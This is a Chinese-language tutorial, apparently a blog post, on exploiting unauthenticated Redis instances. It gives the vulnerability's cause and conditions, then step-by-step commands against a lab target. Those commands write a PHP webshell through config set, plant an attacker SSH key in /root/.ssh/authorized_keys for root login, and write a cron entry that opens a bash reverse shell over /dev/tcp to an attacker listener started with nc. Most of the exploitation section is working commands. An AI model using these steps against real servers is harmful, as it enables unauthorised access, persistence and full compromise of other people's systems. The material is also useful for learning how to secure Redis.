# Redis 未授权访问漏洞

# 漏洞原理

**Redis默认情况下会绑定在0.0.0.0:6379，如果没有采用相关的策略，会将Redis服务暴露在公网上，如果在没有设置密码认证的(一般为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下，利用redis自身提供的config命令，可以进行写文件操作，比如一句话马儿等，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器**



# **利用条件**

- redis绑定在0.0.0.0:6379，并且没有添加防火墙规避避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
- 没有设置密码认证(一般为空)，可以免密码远程登录redis服务



# 漏洞危害

- 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，攻击者也可以恶意执行flushall命令来清空所有数据
- 攻击者可通过eval执行Lua代码，来执行Redis Lua沙箱逃逸漏洞可造成远程代码执行，或通过数据备份功能往磁盘写入后门文件
- 严重的情况，如果redis以root身份允许，攻击者可以使用root账户写入ssh公钥文件，直接通过ssh登录受害者服务器



# 漏洞验证

打开一个新的终端，在窗口使用`redis-cli` -h xxx命令，测试远程能否正常连接redis：

```
redis-cli -h xxx
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715154108381.png)

**连接成功后可以开始写入webshell**

创建两个文件

```
config set dir /tmp
config set dbfilename 
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715160109303.png)

写入一句话马儿

```
config set dbfilename redis.php
set webshell "<?php phpinfo(); ?>"
```

save保存

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715160002564.png)



可以在靶机上查看，已经写入成功 

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715160425897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGc=,size_16,color_FFFFFF,t_70)

**使用蚁剑连接即可**





利用公私钥获取root权限

在靶机中创建ssh公钥存放目录，一般是 /root/.ssh



mkdir /root/.ssh

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715163813594.png)

在攻击机中生成ssh私钥和公钥，密码为空，ssh-keygen -t rsa

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715160954561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGc=,size_16,color_FFFFFF,t_70)

```
进入.ssh目录：cd .ssh/，将生成的公钥保存到1.txt：
(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > 1.txt
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715161600459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGc=,size_16,color_FFFFFF,t_70)

```
连接靶机的Redis，将刚生成的公钥1.txt写入redis
cat 1.txt | redis-cli 192.168.209.136 -x set crack
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715164020868.png)

```
攻击机连接靶机redis：redis-cli -h 192.168.209.136

使用 config get dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys：
config get dir
config set dir /root/.ssh
config set dbfilename "authorized_keys"
save
```



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715164447493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGc=,size_16,color_FFFFFF,t_70)



到这一步，ssh公钥已经成功的写入了靶机。

```
利用ssh免密登录到靶机：ssh -i id_rsa root@192.168.209.136
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715170023682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGc=,size_16,color_FFFFFF,t_70)



## 利用redis反弹shell

原理：在攻击机上开启nc反弹端口监听，通过redis未授权访问漏洞，写入Linux定时计划，反弹shell。

利用条件对`/var/spool/cron`文件夹有写入权限

利用过程首先在攻击机监听一个端口：

```bash
$ nc -lvnp 6666
```

![img](https://img.jbzj.com/file_images/article/202107/2021071110061135.jpg)

在攻击机开启新的命令行窗口，连接受害机的redis服务，然后执行下面的命令：

```bash
$ set x "\n\n\n* * * * * bash -i >& /dev/tcp/192.168.101.8/6666 0>&1\n\n\n"
$ config set dir /var/spool/cron/
$ config set dbfilename root
$ save
```

![img](https://img.jbzj.com/file_images/article/202107/2021071110061136.jpg)

注意此处的计划任务命令，如果在Ubuntu中，是无法反弹shell的，原因是因为ubuntu会将redis写入的缓存乱码当作命令来解释，导致执行不成功。而centos不会对乱码进行解释，可以成功执行反弹shell的命令。

可以在受害机查看文件是否保存成功：

![img](https://img.jbzj.com/file_images/article/202107/2021071110061237.jpg)

但是在ubuntu下无法反弹shell，这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向`/etc/cron.d`目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。